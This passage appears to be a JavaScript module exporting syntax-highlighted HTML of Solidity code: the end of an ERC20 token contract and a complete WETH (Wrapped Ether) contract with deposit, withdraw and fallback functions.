    </span>{
        balanceOf[<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, to, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">transferFrom</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>)
        <span class="hljs-title"><span class="hljs-keyword">public</span></span>
        <span class="hljs-title"><span class="hljs-keyword">virtual</span></span>
        <span class="hljs-title"><span class="hljs-keyword">returns</span></span> (<span class="hljs-params"><span class="hljs-keyword">bool</span></span>)
    </span>{
        <span class="hljs-keyword">uint256</span> allowed <span class="hljs-operator">=</span> allowance[<span class="hljs-keyword">from</span>][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>];
        <span class="hljs-keyword">if</span> (allowed <span class="hljs-operator">!</span><span class="hljs-operator">=</span> <span class="hljs-keyword">type</span>(<span class="hljs-keyword">uint256</span>).<span class="hljs-built_in">max</span>) {
            allowance[<span class="hljs-keyword">from</span>][<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>] <span class="hljs-operator">=</span> allowed <span class="hljs-operator">-</span> amount;
        }
        balanceOf[<span class="hljs-keyword">from</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">from</span>, to, amount);
        <span class="hljs-keyword">return</span> <span class="hljs-literal">true</span>;
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_mint</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> to, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{
        totalSupply <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            balanceOf[to] <span class="hljs-operator">+</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), to, amount);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">_burn</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">from</span>, <span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">internal</span></span> <span class="hljs-title"><span class="hljs-keyword">virtual</span></span> </span>{
        balanceOf[<span class="hljs-keyword">from</span>] <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        <span class="hljs-keyword">unchecked</span> {
            totalSupply <span class="hljs-operator">-</span><span class="hljs-operator">=</span> amount;
        }
        <span class="hljs-keyword">emit</span> Transfer(<span class="hljs-keyword">from</span>, <span class="hljs-keyword">address</span>(<span class="hljs-number">0</span>), amount);
    }
}
</code></pre><pre><code class="language-solidity"><span class="hljs-comment">// SPDX-License-Identifier: MIT</span>
<span class="hljs-meta"><span class="hljs-keyword">pragma</span> <span class="hljs-keyword">solidity</span> 0.8.24;</span>

<span class="hljs-keyword">import</span> <span class="hljs-string">"./ERC20.sol"</span>;

<span class="hljs-class"><span class="hljs-keyword">contract</span> <span class="hljs-title">WETH</span> <span class="hljs-keyword">is</span> <span class="hljs-title">ERC20</span> </span>{
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Deposit</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> account, <span class="hljs-keyword">uint256</span> amount</span>)</span>;
    <span class="hljs-function"><span class="hljs-keyword">event</span> <span class="hljs-title">Withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">address</span> <span class="hljs-keyword">indexed</span> account, <span class="hljs-keyword">uint256</span> amount</span>)</span>;

    <span class="hljs-function"><span class="hljs-keyword">constructor</span>(<span class="hljs-params"></span>) <span class="hljs-title">ERC20</span>(<span class="hljs-params"><span class="hljs-string">"Wrapped Ether"</span>, <span class="hljs-string">"WETH"</span>, <span class="hljs-number">18</span></span>) </span>{}

    <span class="hljs-function"><span class="hljs-keyword">fallback</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        deposit();
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">deposit</span>(<span class="hljs-params"></span>) <span class="hljs-title"><span class="hljs-keyword">public</span></span> <span class="hljs-title"><span class="hljs-keyword">payable</span></span> </span>{
        _mint(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
        <span class="hljs-keyword">emit</span> Deposit(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, <span class="hljs-built_in">msg</span>.<span class="hljs-built_in">value</span>);
    }

    <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">withdraw</span>(<span class="hljs-params"><span class="hljs-keyword">uint256</span> amount</span>) <span class="hljs-title"><span class="hljs-keyword">external</span></span> </span>{
        _burn(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);
        <span class="hljs-keyword">payable</span>(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>).<span class="hljs-built_in">transfer</span>(amount);
        <span class="hljs-keyword">emit</span> Withdraw(<span class="hljs-built_in">msg</span>.<span class="hljs-built_in">sender</span>, amount);
    }
}
</code></pre>`

export default html
